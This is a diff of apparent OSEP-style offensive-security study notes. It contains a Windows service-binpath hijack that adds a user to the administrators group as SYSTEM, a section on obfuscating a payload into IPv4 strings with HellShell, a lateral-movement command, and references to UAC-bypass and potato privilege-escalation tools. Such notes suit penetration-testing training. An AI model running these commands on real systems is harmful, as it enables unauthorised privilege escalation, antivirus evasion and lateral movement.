@@ -3,6 +3,7 @@ Service Modify
 ```powershell
 sc config SNMPTRAP binpath= "cmd.exe /c net localgroup administrators john /add" start= "demand" obj= "NT AUTHORITY\SYSTEM" password= ""
 ```
+
 HTA JS PAYLOAD
 ---------------------
 DotNetToJScript
@@ -33,6 +34,19 @@ self.close();
 </body>
 </html>
 ```
+
+IPV4Shell - HellShell
+---------------------
+URL -> https://github.com/NUL0x4C/HellShell
+
+```powershell
+C:\Users\ctf\Downloads\HellShell-main\HellShell-main\x64\Release\HellShell.exe payload.bin ipv4
+# Generates Ipv4Fuscation.cpp -> Modify 
+Z:\Offsec\OSEP\ipv4shell\src\ipv4shell.c
+```
+Modify the IP values
+and compile to exe
+
 Install AlwaysElevated
 -----------------------
 ```powershell
@@ -68,7 +82,7 @@ Lateral Movement
 ```powershell
 lat.exe <server> <service name> <payload.exe>
 Lat.exe file05 SensorService “C:\windows\tasks\inj.exe”
-``` 
+```
 
 uacbypass.ps1
 SigmaPotato.exe
